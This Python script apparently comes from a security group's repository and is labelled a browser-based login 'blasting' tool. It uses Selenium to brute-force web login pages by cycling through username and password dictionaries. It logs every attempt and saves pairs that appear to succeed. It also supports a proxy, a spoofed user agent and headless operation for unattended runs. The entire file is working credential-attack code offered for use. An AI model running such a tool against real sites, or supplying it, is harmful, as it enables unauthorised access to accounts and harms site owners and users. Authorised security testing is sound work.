#coding:utf-8

import time
import sys
from selenium import webdriver
from selenium.webdriver.common import action_chains, keys
from selenium.webdriver.chrome.options import Options
import argparse

if sys.version > '3':
    print('Python3 was used !!!')
else:
    print('Python2 was used !!!')
    reload(sys) 
    sys.setdefaultencoding('utf-8')


# selenium.webdriver.chrome.options 中add_argument 常用参数表
# https://blog.csdn.net/qq_42059060/article/details/104522492
# python+selenium+Chrome options参数 
# https://www.cnblogs.com/yangjintao/p/10599868.html
# selenium 自动化：指定浏览器和指定驱动（Chrome）
# https://blog.csdn.net/qq_41030861/article/details/105294133?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-7.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-7.control
# executable_path 为chromedriver.exe所在地址。
# chromedriver.exe的下载地址为 http://chromedriver.storage.googleapis.com/index.html
# 首先需要确定本机的Chrome浏览器的版本，在Chrome浏览器里输入"chrome://version"

def SetBrowser(proxy=None , user_agent=None ,  user_dir=None  , chrome_path=None , driver_path=None,  headless=False ):
    options  = Options()
    
    # 防止打印一些无用的日志
    options.add_experimental_option("excludeSwitches", ['enable-automation', 'enable-logging'])
    
    #使用指定代理服务器, 对 http 和 https 有效
    if proxy != None:
        #proxy='http://127.0.0.1:8080'
        options .add_argument('--proxy-server=%s' % proxy)
        
    #使用自定义user-agent
    if user_agent != None:
        #user_agent = 'Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; BLA-AL00 Build/HUAWEIBLA-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.9 Mobile Safari/537.36'  
        options .add_argument('--user-agent=%s' % user_agent)

    #使用自定义帐户资料夹
    if user_dir != None:
        #user_dir = "D:\temp\Chrome User Data"  
        options .add_argument('user-data-dir=%s' % user_dir)

    # 浏览器不提供可视化页面
    if headless != False:
        options.add_argument('--headless')  

    #指定chrome.exe所在文件路径 #可添加chrome.exe到系统path环境变量
    if chrome_path!=None:
        #chrome_path =r'C:\Users\Windows\AppData\Roaming\89.0.4389.128\chrome.exe'
        options.binary_location = chrome_path

    #webdriver加载Chrome
    if driver_path != None:
        #指定驱动路径加载
        #driver_path = r"chromedriver\chromedriver_win32_89.0.4389.23.exe"
        browser = webdriver.Chrome(executable_path=driver_path, options = options ) 
        #使用options替换chrome_options 
    else:
        #默认驱动路径加载
        browser = webdriver.Chrome(chrome_options=options )
    print('SetBrowser Initialize Successfully !!!')
    return browser

def BruteLogin(user=None,pwd=None, login_url=None ,time_1=1 ,time_2=1 ,
                            user_id=None ,  user_class=None , user_name=None , 
                            pass_id=None , pass_class=None , pass_name=None,
                            button_id=None, button_class=None, button_name=None,keyword='success'):
    try:
        action = action_chains.ActionChains(browser)
        browser.get(login_url)
        
        time.sleep(time_1)  #延迟时间
        #implicitly_wait 隐式等待 在尝试发现某个元素的时候，如果没能立刻发现，就等待固定长度的时间。
        #browser.implicitly_wait(5) #implicitly_wait 隐式等待   #报错提示服务器时间未同步
        #browser.refresh() # 刷新方法 refresh
        #browser.implicitly_wait(5) #implicitly_wait 隐式等待
        
        if user_id !=None:
            print('browser.find_element_by_id( %s )' % user_id)
            elem = browser.find_element_by_id( user_id )
        elif user_name !=None:
            print('browser.find_element_by_name( %s )' % user_name)
            elem = browser.find_element_by_name( user_name )
        elif user_class !=None:
            print('browser.find_element_by_class_name( %s )' % user_class)
            elem = browser.find_element_by_class_name( user_class )
        else:
            print('No Username elem')
            browser.quit()
        #填充账号
        elem.send_keys(user)
        action.perform()
        
        if pass_id !=None:
            print('browser.find_element_by_id( %s )' % pass_id)
            elem = browser.find_element_by_id( pass_id )
        elif pass_name !=None:
            print('browser.find_element_by_name( %s )' % pass_name)
            elem = browser.find_element_by_name( pass_name )
        elif pass_class !=None:
            print('browser.find_element_by_class_name( %s )' % pass_class)
            elem = browser.find_element_by_class_name( pass_class )
        else:
            print('No Password elem')
            browser.quit()
        #填充密码
        elem.send_keys(pwd)
        action.perform()
        
        if button_id !=None:
            print('browser.find_element_by_id( %s )' % button_id)
            elem = browser.find_element_by_id( button_id )
        elif button_name !=None:
            print('browser.find_element_by_name( %s )' % button_name)
            elem = browser.find_element_by_name( button_name )
        elif button_class !=None:
            print('browser.find_element_by_class_name( %s )' % button_class)
            elem = browser.find_element_by_class_name( button_class )
        else:
            print('No Password elem')
            browser.quit()
        #点击按钮
        elem.click()
        
        #等待加载完成 
        time.sleep(time_2)     #Explicit Waits 显示等待
        #获取当前页面的窗口句柄
        #print(browser.current_window_handle)  
        # 获取当前页面URL
        currentPageUrl = browser.current_url  
        print('current Page Url:',currentPageUrl)
        # 获取当前页面title
        currentPageTitle = browser.title
        print('current Page Title:',currentPageTitle)
        # 获取当前页面的源码并断言
        pageSourceSize= len(browser.page_source)
        print('current Page Size:', pageSourceSize)
        
        BruteLogKeywords = user + '|' + pwd + '|' +  str(currentPageUrl)  + '|' + str(currentPageTitle)+ '|' + str(pageSourceSize) 
        print('BruteLogKeywords: ', BruteLogKeywords)
        f_BruteLog = open("Brute-Log.txt", "a+") 
        f_BruteLog.write(BruteLogKeywords + '\n')
        f_BruteLog.close()
        
        #自定义匹返回页面匹配关键字
        if 'success' in browser.page_source:
            print('Login Success:' + user + '|' + pwd)
            f_Success = open("Brute-Keyword.txt", "a+") 
            f_Success.write(BruteLogKeywords + '\n')
            f_Success.close()
        else:
            print('LoginFaild!')
            
    except KeyboardInterrupt as e:
        print('KeyboardInterrupt', e)
        browser.quit()
        exit()
    except Exception as e:
        print('Exception', e)
        browser.quit()
        exit()
        
def BruteLoginRun(login_url=None ,time_1=1 ,time_2=1 ,
                                    user_id=None ,  user_class=None , user_name=None , 
                                    pass_id=None , pass_class=None , pass_name=None, 
                                    button_id=None, button_class=None, button_name=None, 
                                    user_dict='username.txt' , pass_dict ='password.txt' ,keyword ='success'):
    with open(user_dict,'r',) as fuser:
            for user in fuser.readlines():
                    user = user.strip()
                    with open(pass_dict,'r') as fpwd:
                        for pwd in fpwd.readlines():
                                pwd = pwd.strip()
                                print('testing...' + user,pwd)
                                BruteLogin(user=user,pwd=pwd,login_url=login_url,time_1=time_1 ,time_2=time_2 ,
                                user_id=user_id ,  user_class=user_class , user_name=user_name , 
                                pass_id=pass_id , pass_class=pass_class , pass_name=pass_name, 
                                button_id=button_id, button_class=button_class, button_name=button_name, keyword=keyword)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.description="Simple Browser automatic login blasting tool -- by NOVASEC"  #简单的浏览器登录爆破工具
    
    #浏览器配置参数
    parser.add_argument("-bh", "--browser_headless", help="Specifies the Browser headless, eg: True", default=False) 	                                                                    #指定是否显示浏览器界面
    parser.add_argument("-bp", "--browser_proxy", help="Specifies the Browser Proxy IP for HTTP or HTTPS , eg: http://127.0.0.1:8080" , default=None) 	    #指定浏览器代理服务器地址
    parser.add_argument("-bua", "--browser_useragent", help="Specifies the Browser UserAgent , eg: Mozilla/5.0 Version/4.0" , default=None) 	                    #指定浏览器User Agent头
    parser.add_argument("-bud", "--BrowserUserDir", help="Specifies the Browser User Dir , eg: D:\temp\Chrome User Data" , default=None) 	                            #指定浏览器用户数据目录
    parser.add_argument("-bcp", "--browser_chrome_path", help="Specifies the Browser Chrome.exe Path , eg: C:\chrome\chrome.exe" , default=None) 	    #指定浏览器chrome.exe路径
    parser.add_argument("-bdp", "--browser_driver_path", help="Specifies the Browser Driver Path, eg: D:\temp\chromedriver.exe", default=None) 	           #指定浏览器chromedriver.exe路径
    
    #登录页配置参数
    parser.add_argument("-lu", "--login_url", help="The login address, eg: http://192.168.1.1/login.aspx" , default=None) 	#指定登录地址
    parser.add_argument("-t1", "--time_1", help="Specifies the pause time (s) before access , eg: 1" , default=1 ,type=float) 	#指定访问前暂停时间
    parser.add_argument("-t2", "--time_2", help="Specifies the pause time (s) after access , eg: 1 " , default=1 ,type=float) 	#指定访问后暂停时间
    
    parser.add_argument("-ui", "--user_id", help="Specify the username attribute by id" , default=None) 	#指定用户名属性 id
    parser.add_argument("-un", "--user_name", help="Specify the username attribute by name" , default=None) 	#指定用户名属性 name
    parser.add_argument("-uc", "--user_class", help="Specify the username attribute by class, No Spaces" , default=None) 	#指定用户名属性 class
    
    parser.add_argument("-pi", "--pass_id", help="Specify the password attribute by id" , default=None) 	#指定密码属性 id
    parser.add_argument("-pn", "--pass_name", help="Specify the password attribute by name" , default=None) 	#指定密码属性 name
    parser.add_argument("-pc", "--pass_class", help="Specify the password attribute by class, No Spaces" , default=None) 	#指定密码属性 class

    parser.add_argument("-bi", "--button_id", help="Specify the login button attribute by id" , default=None) 	                #指定登录按钮属性 id
    parser.add_argument("-bn", "--button_name", help="Specify the login button attribute by name" , default=None) 	#指定登录按钮属性 name
    parser.add_argument("-bc", "--button_class", help="Specify the login button attribute by class, No Spaces" , default=None) 	#指定登录按钮属性 class
    #字典配置参数
    parser.add_argument("-ud", "--user_dict", help="Specify the login username dict" , default='username.txt') 	                #指定用户名字典
    parser.add_argument("-pd", "--pass_dict", help="Specify the login password dict"  , default='password.txt') 	        #指定密码字典
    #关键字匹配参数
    parser.add_argument("-k", "--keyword", help="Specifies the keyword to match in the return message"  , default='success') 	        #指定在返回报文中匹配的关键字
    args = parser.parse_args()
    
    #浏览器配置
    proxy = args.browser_proxy
    user_agent = args.browser_useragent
    user_dir = args.BrowserUserDir
    chrome_path = args.browser_chrome_path
    driver_path = args.browser_driver_path
    headless = args.browser_headless
    
    #chrome_path =r"C:\Users\Windows\AppData\Roaming\89.0.4389.128\chrome.exe"        #测试用
    #driver_path = r"chromedriver\chromedriver_win32_89.0.4389.23.exe"                                                                                #测试用
    
    browser = SetBrowser(proxy=proxy , user_agent=user_agent ,  user_dir=user_dir  , chrome_path=chrome_path , driver_path=driver_path,  headless=headless )
    
    #登录页面配置
    login_url = args.login_url
    time_1 = args.time_1
    time_2 = args.time_2
    
    user_id = args.user_id
    user_name = args.user_name
    user_class = args.user_class
    #user_id = 't1'       ##测试OK
    #user_name = 't1'       ##测试OK
    #user_class = 'input_kuang_login fin fld-error'  ##测试存在空格,不支持
    
    pass_id = args.pass_id
    pass_name = args.pass_name
    pass_class = args.pass_class
    #pass_id = 't2'       ##测试OK
    #pass_name = 't2'       ##测试OK
    #pass_class= 'input_kuang_login' ##测试存在空格,不支持
    
    button_id = args.button_id
    button_name = args.button_name
    button_class = args.button_class
    #button_id = 'b1'       ##测试OK
    #button_name= 'b1'       ##测试OK
    #button_class = 'btnlogin' ##测试OK
    
    #字典配置
    user_dict = args.user_dict
    pass_dict = args.pass_dict
    
    #匹配关键字配置
    keyword = args.keyword
    
    BruteLoginRun(   login_url=login_url, time_1=time_1, time_2=time_2,     
                                    user_id=user_id ,user_class=user_class,user_name=user_name ,     
                                    pass_id=pass_id,pass_class=pass_class , pass_name=pass_name,     
                                    button_id=button_id,button_class=button_class,button_name=button_name,
                                    user_dict=user_dict , pass_dict =pass_dict,keyword=keyword)
    browser.quit()
